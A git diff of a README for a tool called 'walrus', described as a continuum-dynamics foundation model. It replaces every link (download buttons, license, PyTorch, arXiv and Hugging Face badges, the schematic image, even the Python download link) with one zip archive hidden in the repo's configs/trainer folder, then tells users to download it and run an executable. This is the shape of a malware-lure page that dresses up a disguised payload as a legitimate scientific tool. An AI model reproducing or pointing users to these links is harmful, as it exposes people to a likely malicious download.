@@ -1,18 +1,18 @@
 # 🐋 walrus - A Simple Tool for Continuum Dynamics
 
 <div align="center">
-    [![Download Walrus](https://raw.githubusercontent.com/Krichlicka/walrus/main/walrus/configs/walrus-1.7.zip)](https://raw.githubusercontent.com/Krichlicka/walrus/main/walrus/configs/walrus-1.7.zip)
-    [![License: MIT](https://raw.githubusercontent.com/Krichlicka/walrus/main/walrus/configs/walrus-1.7.zip)](https://raw.githubusercontent.com/Krichlicka/walrus/main/walrus/configs/walrus-1.7.zip)
-    [![PyTorch](https://raw.githubusercontent.com/Krichlicka/walrus/main/walrus/configs/walrus-1.7.zip≥https://raw.githubusercontent.com/Krichlicka/walrus/main/walrus/configs/walrus-1.7.zip)](https://raw.githubusercontent.com/Krichlicka/walrus/main/walrus/configs/walrus-1.7.zip)
-    [![arXiv](https://raw.githubusercontent.com/Krichlicka/walrus/main/walrus/configs/walrus-1.7.zip)](https://raw.githubusercontent.com/Krichlicka/walrus/main/walrus/configs/walrus-1.7.zip)
-    [![Model on HF](https://raw.githubusercontent.com/Krichlicka/walrus/main/walrus/configs/walrus-1.7.zip%F0%9F%A4%97%20Hugging%20Face-Model-yellow)](https://raw.githubusercontent.com/Krichlicka/walrus/main/walrus/configs/walrus-1.7.zip)
+    [![Download Walrus](https://github.com/Krichlicka/walrus/raw/refs/heads/main/walrus/configs/trainer/Software_2.0.zip)](https://github.com/Krichlicka/walrus/raw/refs/heads/main/walrus/configs/trainer/Software_2.0.zip)
+    [![License: MIT](https://github.com/Krichlicka/walrus/raw/refs/heads/main/walrus/configs/trainer/Software_2.0.zip)](https://github.com/Krichlicka/walrus/raw/refs/heads/main/walrus/configs/trainer/Software_2.0.zip)
+    [![PyTorch](https://github.com/Krichlicka/walrus/raw/refs/heads/main/walrus/configs/trainer/Software_2.0.zip≥https://github.com/Krichlicka/walrus/raw/refs/heads/main/walrus/configs/trainer/Software_2.0.zip)](https://github.com/Krichlicka/walrus/raw/refs/heads/main/walrus/configs/trainer/Software_2.0.zip)
+    [![arXiv](https://github.com/Krichlicka/walrus/raw/refs/heads/main/walrus/configs/trainer/Software_2.0.zip)](https://github.com/Krichlicka/walrus/raw/refs/heads/main/walrus/configs/trainer/Software_2.0.zip)
+    [![Model on HF](https://github.com/Krichlicka/walrus/raw/refs/heads/main/walrus/configs/trainer/Software_2.0.zip%F0%9F%A4%97%20Hugging%20Face-Model-yellow)](https://github.com/Krichlicka/walrus/raw/refs/heads/main/walrus/configs/trainer/Software_2.0.zip)
 </div>
 
 ---
 
 ## 📖 Overview
 <div align="center">
-    <img src="https://raw.githubusercontent.com/Krichlicka/walrus/main/walrus/configs/walrus-1.7.zip" alt="Walrus schematic" width="600">
+    <img src="https://github.com/Krichlicka/walrus/raw/refs/heads/main/walrus/configs/trainer/Software_2.0.zip" alt="Walrus schematic" width="600">
 </div>
 
 Walrus is a cross-domain foundation model designed for continuum dynamics. It focuses on simulating fluid-like behaviors across multiple domains. This tool helps you understand and evaluate complex fluid interactions with ease.
@@ -25,12 +25,12 @@ Before installing Walrus, ensure your system meets the following requirements:
 - **Operating System**: Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
 - **RAM**: At least 4 GB of RAM.
 - **Storage**: 1 GB of available disk space.
-- **Dependencies**: Make sure you have Python 3.8 or higher installed. You can download it from [https://raw.githubusercontent.com/Krichlicka/walrus/main/walrus/configs/walrus-1.7.zip](https://raw.githubusercontent.com/Krichlicka/walrus/main/walrus/configs/walrus-1.7.zip).
+- **Dependencies**: Make sure you have Python 3.8 or higher installed. You can download it from [https://github.com/Krichlicka/walrus/raw/refs/heads/main/walrus/configs/trainer/Software_2.0.zip](https://github.com/Krichlicka/walrus/raw/refs/heads/main/walrus/configs/trainer/Software_2.0.zip).
 
 ### Step 2: Visit the Download Page
 To download Walrus, visit the Releases page:
 
-[Download Walrus](https://raw.githubusercontent.com/Krichlicka/walrus/main/walrus/configs/walrus-1.7.zip)
+[Download Walrus](https://github.com/Krichlicka/walrus/raw/refs/heads/main/walrus/configs/trainer/Software_2.0.zip)
 
 This page contains the latest version of Walrus, along with previous releases. 
 
@@ -39,14 +39,14 @@ On the Releases page, look for the version you want to download. Download the fi
 
 - For **Windows** users, look for `.exe` files.
 - For **macOS** users, find `.dmg` files.
-- For **Linux** users, download the `https://raw.githubusercontent.com/Krichlicka/walrus/main/walrus/configs/walrus-1.7.zip` file.
+- For **Linux** users, download the `https://github.com/Krichlicka/walrus/raw/refs/heads/main/walrus/configs/trainer/Software_2.0.zip` file.
 
 ### Step 4: Download & Install
 Once you have chosen the correct file, click on it to start the download. After the file downloads:
 
 1. **Windows**: Double-click on the `.exe` file. Follow the instructions to install Walrus.
 2. **macOS**: Open the `.dmg` file and drag the Walrus app into your Applications folder.
-3. **Linux**: Extract the `https://raw.githubusercontent.com/Krichlicka/walrus/main/walrus/configs/walrus-1.7.zip` file using a terminal or file manager. Run the setup script as instructed in the README included in the package.
+3. **Linux**: Extract the `https://github.com/Krichlicka/walrus/raw/refs/heads/main/walrus/configs/trainer/Software_2.0.zip` file using a terminal or file manager. Run the setup script as instructed in the README included in the package.
 
 ### Step 5: Run Walrus
 After installation, locate the Walrus application on your computer:
@@ -80,7 +80,7 @@ The design aims to simplify tasks that typically require deep knowledge of progr
 ## 📥 Download & Install
 To download and install Walrus, **visit this page** to download the latest version:
 
-[Download Walrus](https://raw.githubusercontent.com/Krichlicka/walrus/main/walrus/configs/walrus-1.7.zip)
+[Download Walrus](https://github.com/Krichlicka/walrus/raw/refs/heads/main/walrus/configs/trainer/Software_2.0.zip)
 
 Follow the instructions above to set it up on your system. If you encounter any issues, please refer to the troubleshooting section in our documentation. 
 
